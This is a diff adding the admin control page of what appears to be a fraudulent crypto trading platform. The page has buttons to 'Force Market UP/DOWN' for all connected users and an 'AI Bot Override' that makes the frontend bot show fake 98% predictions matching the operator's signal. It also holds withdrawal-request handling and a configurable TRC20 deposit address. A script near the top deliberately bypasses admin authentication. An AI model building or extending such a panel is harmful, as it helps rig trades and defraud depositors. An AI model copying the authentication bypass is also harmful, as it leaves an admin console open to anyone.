@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quotex Pro Admin | Control Center</title>
+    <!-- FONTS -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+    <!-- STYLES -->
+    <link rel="stylesheet" href="css/admin.css">
+</head>
+
+<body>
+
+    <!-- AUTH GUARD (BYPASSED FOR DEVELOPMENT) -->
+    <div id="loginOverlay" style="display: none;">
+        <div class="login-box">
+            <h3 style="color:#fff; margin-top:0; margin-bottom: 2rem;">ADMIN AUTHENTICATION</h3>
+            <input type="email" id="adminEmail" placeholder="Admin Email" autocomplete="email">
+            <input type="password" id="adminPass" placeholder="Password" autocomplete="current-password">
+            <button onclick="login()">UNLOCK SYSTEM</button>
+            <p style="color:#555; font-size:11px; margin-top:20px; line-height: 1.5;">
+                <i class="fas fa-lock"></i> Secured by Firebase Auth<br>
+                Enable "Email/Password" in Firebase Console.
+            </p>
+        </div>
+    </div>
+
+    <!-- BYPASS SCRIPT - Remove for production -->
+    <script>
+        // Hide login overlay immediately - bypass authentication
+        console.log("⚠️ ADMIN LOGIN BYPASSED - Development Mode");
+        document.getElementById('loginOverlay').style.display = 'none';
+    </script>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+        <div
+            style="font-weight:800; color:#fff; font-size:18px; margin-bottom:20px; display:flex; align-items:center; gap:10px;">
+            <i class="fas fa-shield-alt" style="color:var(--accent-green)"></i> QTX ADMIN
+        </div>
+
+        <div class="nav-item active" data-section="dashboardSection">
+            <i class="fas fa-tachometer-alt"></i> Dashboard
+        </div>
+        <div class="nav-item" data-section="withdrawalsSection">
+            <i class="fas fa-money-bill-wave"></i> Withdrawals
+            (<span id="withCount">0</span>)
+        </div>
+        <div class="nav-item" data-section="settingsSection">
+            <i class="fas fa-cog"></i> Global Settings
+        </div>
+
+        <div style="margin-top:auto">
+            <div class="nav-item" onclick="logout()" style="color: var(--accent-red)">
+                <i class="fas fa-sign-out-alt"></i> Logout
+            </div>
+        </div>
+    </div>
+
+    <!-- CONTENT AREA -->
+    <div class="content">
+
+        <!-- DASHBOARD SECTION -->
+        <div id="dashboardSection" class="content-section" style="display:block;">
+            <div class="header-row">
+                <h1>Live Control Room</h1>
+                <div class="status-badge online" id="connStatus">● SYSTEM ONLINE</div>
+            </div>
+
+            <div class="card-grid">
+                <!-- MARKET MANIPULATION -->
+                <div class="card">
+                    <div class="card-title">Market Manipulation</div>
+
+                    <button class="control-btn control-up" onclick="sendSignal('UP')">
+                        <i class="fas fa-arrow-up"></i> Force Market UP
+                    </button>
+
+                    <button class="control-btn control-down" onclick="sendSignal('DOWN')">
+                        <i class="fas fa-arrow-down"></i> Force Market DOWN
+                    </button>
+
+                    <button style="background:#222; color:#fff; border:1px solid #333; margin-top:10px;"
+                        onclick="sendSignal('NEUTRAL')">
+                        <i class="fas fa-sync-alt"></i> Reset to Normal
+                    </button>
+
+                    <div
+                        style="margin-top:20px; text-align:center; font-size:12px; color:#555; border-top:1px solid #222; padding-top:15px;">
+                        Current Active Signal:<br>
+                        <span id="currentSignal"
+                            style="color:#fff; font-size:14px; font-weight:800; display:block; margin-top:5px;">NEUTRAL</span>
+                    </div>
+                </div>
+
+                <!-- AI BOT OVERRIDE -->
+                <div class="card">
+                    <div class="card-title">AI Bot Override</div>
+                    <p style="font-size:13px; color:#777; line-height: 1.6;">
+                        The AI Bot on the frontend is synchronized with these controls.
+                    </p>
+                    <ul style="font-size:13px; color:#666; padding-left: 20px; margin-top:10px;">
+                        <li style="margin-bottom:8px;"><strong style="color:var(--accent-green)">UP Signal</strong> =
+                            Bot predicts "CALL 98%"</li>
+                        <li><strong style="color:var(--accent-red)">DOWN Signal</strong> = Bot predicts "PUT 98%"</li>
+                    </ul>
+                    <div
+                        style="background: rgba(0,0,0,0.3); padding:10px; border-radius:6px; margin-top:20px; font-size:12px; color:#555;">
+                        <i class="fas fa-info-circle"></i> Signals propagate instantly to all connected clients via
+                        Firebase Realtime Database.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- WITHDRAWALS SECTION -->
+        <div id="withdrawalsSection" class="content-section">
+            <div class="header-row">
+                <h1>Withdrawal Requests</h1>
+                <button class="action-btn" onclick="startListeners()" style="width:auto"><i class="fas fa-sync"></i>
+                    Refresh</button>
+            </div>
+
+            <div class="card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>Network</th>
+                            <th>Address</th>
+                            <th>Amount</th>
+                            <th>Status</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="withdrawalTable">
+                        <!-- Populated by JS -->
+                    </tbody>
+                </table>
+                <div id="emptyWithdrawals"
+                    style="text-align:center; padding:40px; color:#444; font-size:13px; font-style:italic;">
+                    No pending requests found.
+                </div>
+            </div>
+        </div>
+
+        <!-- SETTINGS SECTION -->
+        <div id="settingsSection" class="content-section">
+            <h1>Global Settings</h1>
+            <p style="color:#666; font-size:13px; margin-bottom: 30px;">Manage global application variables.</p>
+
+            <div class="card" style="max-width:500px;">
+                <div style="margin-bottom:25px;">
+                    <label
+                        style="display:block; font-size:11px; color:#888; font-weight:700; margin-bottom:8px; text-transform:uppercase;">TRC20
+                        Deposit Address</label>
+                    <input type="text" id="walletInput" class="mono-font" value="LOADING...">
+                    <p style="font-size:11px; color:#444; margin-top:5px;">This address will appear on the frontend
+                        deposit modal.</p>
+                </div>
+                <button onclick="saveSettings()">Save Configuration</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- FIREBASE SDKs (Compat version for v8 styles used in this stack) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <!-- APP LOGIC -->
+    <script src="js/firebase-config.js"></script>
+    <script src="js/admin-core.js"></script>
+
+</body>
+
+</html>
